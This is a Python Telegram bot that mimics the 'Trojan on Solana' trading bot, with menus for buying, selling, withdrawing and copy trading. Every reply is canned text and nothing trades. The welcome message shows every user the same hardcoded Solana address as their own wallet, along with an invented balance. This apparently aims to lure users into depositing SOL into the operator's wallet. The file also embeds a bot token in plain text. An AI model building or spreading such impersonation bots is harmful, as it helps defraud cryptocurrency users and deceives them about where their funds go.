import logging
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update, Bot
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
import os

# Set up logging
logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

# Bot token (replace with your bot token)
BOT_TOKEN = "7761108718:AAFmR_1ZtMAXX8DBi_r3BCo7418MtK6C1GU"

# Define the main menu keyboard
def main_menu_keyboard():
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("Buy", callback_data="buy"),
            InlineKeyboardButton("Sell", callback_data="sell"),
        ],
        [
            InlineKeyboardButton("Positions", callback_data="positions"),
            InlineKeyboardButton("Limit Orders", callback_data="limit_orders"),
        ],
        [
            InlineKeyboardButton("Referrals", callback_data="referrals"),
            InlineKeyboardButton("Withdraw", callback_data="withdraw"),
        ],
        [
            InlineKeyboardButton("Copy Trade", callback_data="copy_trade"),
            InlineKeyboardButton("Help", callback_data="help"),
        ],
    ])

# Define a keyboard for the Copy Trade menu
def copy_trade_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("New", callback_data="new_copy_trade")],
        [InlineKeyboardButton("Go Back to Main Menu", callback_data="back_to_main")],
    ])

# Define a keyboard to go back to the main menu
def back_to_main_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("Go Back to Main Menu", callback_data="back_to_main")],
    ])

# Function to handle the /start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    # Update the file path to be dynamic (use a local path for testing or a URL for production)
    video_path = "C:/Users/IYOHA ODUTOLA/Documents/new python bot/WhatsApp Video 2024-12-03 at 12.58.12 AM.mp4"
    
    # Send video and handle missing file error
    try:
        if os.path.exists(video_path):  # Check if file exists
            with open(video_path, 'rb') as video_file:
                await context.bot.send_video(
                    chat_id=update.effective_chat.id,
                    video=video_file,
                    caption="Welcome to Trojan on Solana! 🎥"
                )
        else:
            logger.error(f"Video file not found at {video_path}")
            await update.message.reply_text("Error: Welcome video not available.")
            return
    except Exception as e:
        logger.error(f"Error sending video: {e}")
        await update.message.reply_text("Error: Could not send video.")
    
    # Send the welcome text
    welcome_message = (
        f"Welcome to Trojan on Solana, {update.message.from_user.first_name}!\n\n"
        "Introducing a cutting-edge bot crafted exclusively for Solana Traders. "
        "Trade any token instantly right after launch.\n\n"
        "💳 *Solana Address:*\n"
        "`CTbFNi9v996i1Xbrg2QRXjJhXvLPiZAhqaG3HNkMfgat`\n"
        "(tap to copy)\n\n"
        "💰 *Balance:* 2.419 SOL\n\n"
        "Click on the *Refresh* button to update your current balance.\n\n"
        "Join our Telegram group @trojan for users of Trojan!"
    )
    await update.message.reply_text(welcome_message, parse_mode="Markdown", reply_markup=main_menu_keyboard())

# Function to handle button presses
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer()

    # Handle button presses
    if query.data == "buy":
        message = (
            "🛒 *Buy $SLND (Solend)* 📈\n\n"
            "Share token with your Reflink\n\n"
            "💰 *Balance:* _-_ SOL – W1 📝\n\n"
            "💲 *Price:* $0.3594\n"
            "💧 *Liquidity:* $17.48K\n"
            "📊 *Market Cap:* $35.94M\n\n"
            "30m: -1.64% | 24h: -5.66%\n\n"
            "❌ *Renounced:* ✖️\n\n"
            "🔴 *Insufficient balance for buy amount + gas*"
        )
        await query.edit_message_text(message, parse_mode="Markdown", reply_markup=back_to_main_keyboard())
    elif query.data == "sell":
        message = "You do not have any tokens yet! Start trading in the Buy menu."
        await query.edit_message_text(message, parse_mode="Markdown", reply_markup=back_to_main_keyboard())
    elif query.data == "positions":
        message = "You do not have any tokens yet! Start trading in the Buy menu."
        await query.edit_message_text(message, parse_mode="Markdown", reply_markup=back_to_main_keyboard())
    elif query.data == "limit_orders":
        message = "You have no limit orders. Create a limit order from the Buy and Sell menu."
        await query.edit_message_text(message, parse_mode="Markdown", reply_markup=back_to_main_keyboard())
    elif query.data == "referrals":
        message = (
            "💰 *Invite your friends to save 10% on fees.*\n\n"
            "If you've traded more than $10k volume in a week, you'll receive a 35% share of the fees paid by your referees! "
            "Otherwise, you'll receive a 25% share.\n\n"
            "*Your Referrals (updated every 15 min):*\n"
            "• Users referred: 0 (direct: 0, indirect: 0)\n"
            "• Total rewards: 0 SOL ($0.00)\n"
            "• Total paid: 0 SOL ($0.00)\n"
            "• Total unpaid: 0 SOL ($0.00)\n\n"
            "Rewards are paid daily and airdropped directly to your chosen Rewards Wallet. "
            "You must have accrued at least 0.005 SOL in unpaid fees to be eligible for a payout.\n\n"
            "Your Referral Link:\n"
            "[https://t.me/solana_trojanbot?start](https://t.me/solana_trojanbot?start)\n\n"
            "Stay tuned for more details on how we'll reward active users and happy trading!"
        )
        await query.edit_message_text(message, parse_mode="Markdown", reply_markup=back_to_main_keyboard())
    elif query.data == "withdraw":
        message = (
            "💸 *Withdraw Funds*\n\n"
            "Select a token to withdraw (e.g., Solana):\n\n"
            "• *SOL* — (0.00)\n\n"
            "🔴 *Insufficient SOL balance.*\n\n"
            "Ensure your withdrawal amount exceeds the minimum required balance before initiating a withdrawal."
        )
        await query.edit_message_text(message, parse_mode="Markdown", reply_markup=back_to_main_keyboard())
    elif query.data == "copy_trade":
        message = (
            "🔄 *Copy Trade*\n\n"
            "Copy Trade allows you to copy the buys and sells of any target wallet.\n\n"
            "🟢 *Indicates* a copy trade setup is active.\n"
            "🟠 *Indicates* a copy trade setup is paused.\n\n"
            "You do not have any copy trades setup yet. Click on the *New* button to create one."
        )
        await query.edit_message_text(message, parse_mode="Markdown", reply_markup=copy_trade_keyboard())
    elif query.data == "help":
        message = (
            "❓ *Help Center*\n\n"
            "Need assistance? Contact support or join the @trojan group for community support and updates."
        )
        await query.edit_message_text(message, parse_mode="Markdown", reply_markup=back_to_main_keyboard())
    elif query.data == "back_to_main":
        await query.edit_message_text("Returning to the main menu...", reply_markup=main_menu_keyboard())
    elif query.data == "new_copy_trade":
        message = (
            "🛠️ *Create New Copy Trade*\n\n"
            "Please provide the target wallet address you'd like to copy trades from."
        )
        await query.edit_message_text(message, parse_mode="Markdown", reply_markup=back_to_main_keyboard())
    else:
        await query.edit_message_text("⚠️ *Feature not implemented yet.*", reply_markup=back_to_main_keyboard())

# Function to clear any existing webhook (important for resolving conflicts)
def clear_webhook():
    bot = Bot(BOT_TOKEN)
    bot.delete_webhook(drop_pending_updates=True)
    logger.info("Webhook cleared.")

# Function to run the bot
def run_bot():
    # Clear any existing webhook before starting the bot
    clear_webhook()

    # Create the Application object and start the polling process
    application = Application.builder().token(BOT_TOKEN).build()

    # Add command and callback handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button_handler))

    # Run the bot using polling
    application.run_polling()

# Entry point
if __name__ == "__main__":
    run_bot()
